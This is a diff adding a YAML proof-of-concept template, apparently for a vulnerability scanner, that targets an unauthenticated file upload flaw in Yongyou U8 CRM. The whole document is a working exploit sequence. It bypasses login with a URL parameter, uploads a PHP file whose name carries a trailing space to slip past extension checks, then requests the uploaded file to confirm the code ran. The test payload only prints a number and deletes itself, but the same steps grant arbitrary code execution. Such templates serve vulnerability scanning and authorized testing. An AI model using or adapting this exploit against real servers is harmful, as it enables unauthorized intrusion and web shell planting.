@@ -1,0 +1,41 @@
+name: poc-yaml-yongyou-u8-CRM-files-upload
+transport: http
+  
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /ajax/uploadfile.php?DontCheckLogin=1&vname=file
+      headers:
+        Content-Type: multipart/form-data; boundary=----269520967239406871642430066855
+      body: "\
+        ------269520967239406871642430066855\r\n\
+        Content-Disposition: form-data; name=\"file\"; filename=\"1.php \"\r\n\
+        Content-Type: application/octet-stream\r\n\
+        \r\n\
+        <?php print(111*222);unlink(__FILE__);?>\r\n\
+        ------269520967239406871642430066855\r\n\
+        Content-Disposition: form-data; name=\"upload\"\r\n\
+        \r\n\
+        upload\r\n\
+        ------269520967239406871642430066855--\r\n\
+        "
+    expression: response.status == 200
+    output:
+      search: '"(?P<uploadfile>upd[0-9a-zA-Z]+\\.tmp.php)".bsubmatch(response.body)'
+      uploadfile: search["uploadfile"]
+  r1:
+    request:
+      method: GET
+      path: /tmpfile/{{uploadfile}}
+    expression: response.status == 200 && response.body.bcontains(b'24642')
+expression: r0() && r1()
+
+
+detail:
+  author: Superhero
+  links:
+    - https://superhero.blog.csdn.net/article/details/139158415
+
+
